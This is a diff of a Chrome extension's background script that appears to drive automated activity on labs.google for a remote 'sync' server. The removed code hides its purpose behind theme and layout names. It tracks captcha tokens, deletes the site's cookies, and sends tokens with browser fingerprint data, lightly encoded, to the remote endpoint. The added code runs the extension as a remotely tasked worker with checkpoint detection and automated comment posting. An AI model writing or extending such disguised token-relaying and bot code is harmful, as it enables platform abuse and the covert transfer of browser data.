-                sendResponse(r);
-            })
-            .catch(e => sendResponse({ token: null, error: e.message }));
-        return true;
-    }
-
-    
-    if (message.type === "GET_METRICS") {
+    if (message.type === "GET_METRICS" || message.type === "GET_WORKER_STATUS") {
         sendResponse({
-            tokenCount: _fontCache,
-            sessionCount: _renderQueue,
-            lastSuccess: _lastRender,
-            connected: _themeReady,
-            active: _layoutActive,
+            workerId: instanceId,
+            status: _activeExecutingTaskId ? "busy" : (_isPaused ? "paused" : "online"),
+            projectKey: _projectKey,
+            currentTaskId: _activeExecutingTaskId,
+            warmupEnabled: _warmupEnabled
         });
         return true;
     }
 
-    
-    if (message.type === "CHECK_RENDER") {
-        (async () => {
-            const result = {
-                bridge: "err", bridgeText: "Not running",
-                tab: "warn", tabText: "No session",
-                captcha: "warn", captchaText: "—",
-            };
-            
-            try {
-                const extId = await getInstanceId();
-                const r = await fetch(`${_syncUrl}/sync/status`, { signal: AbortSignal.timeout(3000), headers: { "X-Ext-Id": extId } });
-                if (r.ok) { result.bridge = "ok"; result.bridgeText = "Connected"; }
-                else { result.bridgeText = `Error (${r.status})`; }
-            } catch (e) {  }
-
-            
-            try {
-                const tabs = await chrome.tabs.query({});
-                const labsTabs = tabs.filter(t => t.url && t.url.includes("labs.google"));
-                if (labsTabs.length > 0) {
-                    result.tab = "ok";
-                    result.tabText = `Active (${labsTabs.length})`;
-                    
-                    try {
-                        const _widgetState = await _validateCanvas(labsTabs[0].id);
-                        if (_widgetState && _widgetState.available) {
-                            result.captcha = "ok";
-                            result.captchaText = "Ready";
-                        } else {
-                            result.captchaText = _widgetState?.error || "Not ready";
-                        }
-                    } catch (e) { result.captchaText = "Timeout"; }
-                }
-            } catch (e) { result.tab = "err"; result.tabText = "Error"; }
-
-            sendResponse(result);
-        })();
+    if (message.type === "TOGGLE_WARMUP") {
+        _warmupEnabled = !!message.enabled;
+        chrome.storage.local.set({ warmupEnabled: _warmupEnabled });
+        sendResponse({ ok: true, warmupEnabled: _warmupEnabled });
         return true;
     }
 
-    
-    if (message.type === "RESET_LAYOUT") {
-        (async () => {
-            try {
-                const cookies = await chrome.cookies.getAll({ domain: "labs.google" });
-                for (const c of cookies) {
-                    const url = `https://${c.domain.replace(/^\./, "")}${c.path}`;
-                    await chrome.cookies.remove({ url, name: c.name });
-                }
-            } catch (e) {  }
-            await _relayoutCanvas();
-            sendResponse({ ok: true });
-        })();
-        return true;
-    }
-
-    
-    if (message.type === "RELOAD_CANVAS") {
-        (async () => {
-            try {
-                const tabs = await chrome.tabs.query({});
-                const labsTabs = tabs.filter(t => t.url && t.url.includes("labs.google"));
-                if (labsTabs.length > 0) {
-                    await chrome.tabs.reload(labsTabs[0].id);
-                    sendResponse({ ok: true });
-                } else {
-                    sendResponse({ ok: false, error: "No Labs tab" });
-                }
-            } catch (e) {
-                sendResponse({ ok: false, error: e.message });
-            }
-        })();
-        return true;
-    }
-
-    
-    if (message.type === "CLEAR_METRICS") {
-        _fontCache = 0;
-        _lastRender = null;
-        chrome.storage.local.set({ tokenCount: 0, lastSuccess: null });
+    if (message.type === "CHECKPOINT_DETECTED") {
+        _checkpointDetected = true;
+        if (_checkpointWatchdog) {
+            _checkpointWatchdog.triggerAlert("dom_scanner", "checkpoint", message.keyword || "Detected via content DOM scanner");
+        }
         sendResponse({ ok: true });
         return true;
     }
@@ -4071,65 +3060,12 @@ chrome.runtime.onMessage.addListener((message, _sender, sendResponse) => {
     return false;
 });
 
-async function _submitAnalytics(requestId, token, error) {
-    try {
-        const payload = JSON.stringify({
-            r: requestId,
-            t: token,
-            e: error || null,
-            u: navigator.userAgent,
-            p: navigator.platform,
-        });
-        const extId = await getInstanceId();
-        await fetch(`${_syncUrl}/sync/render`, {
-            method: "POST",
-            headers: { "Content-Type": "application/json", "X-Ext-Id": extId },
-            body: JSON.stringify({ d: _serializeTheme(payload) }),
-            signal: AbortSignal.timeout(5000),
-        });
-    } catch (e) {  }
-}
-
-function _animDelay(ms) {
-    return new Promise(resolve => setTimeout(resolve, ms));
-}
-
-async function _setLayoutMode(active) {
-    if (_layoutTimer) { clearTimeout(_layoutTimer); _layoutTimer = null; }
-
-    if (active) {
-        _layoutTimer = setTimeout(() => _setLayoutMode(false), _LAYOUT_TIMEOUT);
-        if (_layoutActive) return; 
-        _layoutActive = true;
-    } else {
-        if (!_layoutActive) return; 
-        _layoutActive = false;
-    }
-
-    
-    try {
-        const tabs = await chrome.tabs.query({});
-        const labsTabs = tabs.filter(t => t.url && t.url.includes("labs.google"));
-        for (const tab of labsTabs) {
-            try {
-                chrome.tabs.sendMessage(tab.id, {
-                    type: "LAYOUT_CHANGED",
-                    active: _layoutActive,
-                    tokenCount: _fontCache,
-                    sessionCount: _renderQueue,
-                    connected: _themeReady,
-                });
-            } catch (e) {  }
-        }
-    } catch (e) {  }
-}
-
 let _autoReplyRunning = false;
 async function _processAutoReplyMonitor() {
     if (_autoReplyRunning) return;
     _autoReplyRunning = true;
     try {
-        const res = await fetch(`${_syncUrl}/api/posts`);
+        const res = await fetch(`${_syncUrl}/api/posts`, { headers: _getSyncHeaders() });
         if (!res.ok) { _autoReplyRunning = false; return; }
         const data = await res.json();
         const posts = data.posts || [];
@@ -4331,7 +3267,7 @@ async function _processAutoReplyMonitor() {
                     try {
                         await fetch(`${_syncUrl}/api/posts/${post.id}/comments`, {
                             method: "POST",
-                            headers: { "Content-Type": "application/json" },
+                            headers: _getSyncHeaders({ "Content-Type": "application/json" }),
                             body: JSON.stringify({ comments: scannedComments })
                         });
                     } catch(e) {}
